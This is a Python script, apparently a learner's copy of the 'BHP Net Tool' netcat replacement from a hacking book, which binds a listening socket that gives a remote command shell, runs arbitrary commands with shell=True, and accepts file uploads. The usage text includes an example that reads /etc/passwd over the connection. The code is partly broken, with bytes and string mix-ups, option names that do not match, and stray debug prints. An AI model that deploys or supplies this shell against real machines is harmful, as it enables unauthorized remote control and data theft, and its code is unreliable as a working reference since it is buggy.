import sys
import socket
import getopt
import threading
import subprocess

#gloabal variables

listen = False
command = False
upload = False
execute = ""
target = ""
port = 0
upload_destination = ""

def usage():
	print ("BHP Net Tool")
	print 
	print ("Usage: bhpnet.py -t target_host -p port")
	print ("-l --listen - listen on [host]:[port] forincoming connections")
	print ("-e --execute=file_to_run - execute the given file uponreceiving a connection")
	print ("-c --command - initialize a command shell")
	print ("-u --upload=destination - upon receiving connection upload a file and write to [destination]")

	print 
	print 
	print ("Examples: ")
	print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
	print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
	print ("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
	print ("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
	sys.exit(0)


def main():
	global listen
	global command
	global upload
	global execute
	global target
	global port
	global upload_destination
	
	if not len(sys.argv[1:]):
		usage()
	try:
		opts,arg=getopt.getopt(sys.argv[1:], "hle:t:p:cu", ["help","target","port","command","upload"])
		print(arg)
		print(opts)
	except getopt.GetoptError as e:
		print(e)
		usage()

	for o,a in opts:
		if o in ( "-h", "--help"):
			usage()
		elif o in ("-l", "--listen"):
			listen=True
		elif o in ("-e", "--execute"):
			execute=a
		elif o in ("-c", "--commandshell"):
			command=True
		elif o in ("-u", "--upload"):
			upload=a
		elif o in ("-t", "--target"):
			target=a
		elif o in ("-p", "--port"):
			port= int(a)
		else:
			print("pailas options")

	print("listen: "+ str(listen))
	print("execute: "+ str(execute))
	print("commandshell: "+str(command))
	print("upload: "+str(upload))
	print("target: "+str(target))
	print("port: "+ str(port))

	if not listen and len(target) and port > 0:
		buffer= sys.stdin.read()
		client_sender(buffer)

	if listen:
		server_loop()

def client_sender(buffer):
	
	client= socket.socket(socket.AF_INET,socket.SOCK_STREAM)

	try:
		client.connect((target,port))
		if len(buffer):
			client.send(buffer.encode())

		while True:
			recv_len=1
			response=""
			while recv_len:
				data= client.recv(4096).decode()
				recv_len= len(data)
				response+=data

				if recv_len < 4096:
					break
			print (response)
			buffer= input("")
			buffer+="\n"
			client.send(buffer.encode())
	except Exception as e:
		print("eeror exiting..")
		print(e)
		client.close()

def server_loop():
	global target
	global port

	print("pasacomand2")


	if not len(target):
		target = "0.0.0.0"

	server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True:
		client_socket,addr= server.accept()

		client_thread= threading.Thread(target=client_handler,args=(client_socket,))

		client_thread.start()

def run_command(command):
	command= command.rstrip()

	
	try:
		output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	except:
		output="FAiled execute command \r\n"

	

	return output

#client handler
def client_handler(client_socket):
	global upload
	global execute
	global command

	print("pasacomand")


	if len(upload_destination):
		file_buffer=""

		while True:
			data=client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data
		try:
			file_descriptor= open(upload_destination,"wb")
			file_descriptor.write(file_buffer)
			file_descriptor.close()
			client_socket.send("successfully %s"% upload_destination)
		except :
			client_socket.send("Failed to save file to %s \r\n "% upload_destination)

	if len(execute):
		
		output= run_command(execute)

		client_socket.send(output)

	if command:
		while True:
			client_socket.sendall(b"<BHP:#>")
			cmd_buffer= ""
			while "\n" not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024).decode()
			

			print(cmd_buffer)	
			response= run_command(cmd_buffer)

			print("holaa")
			print(response)

			client_socket.send(response)


if __name__ == '__main__':
	main()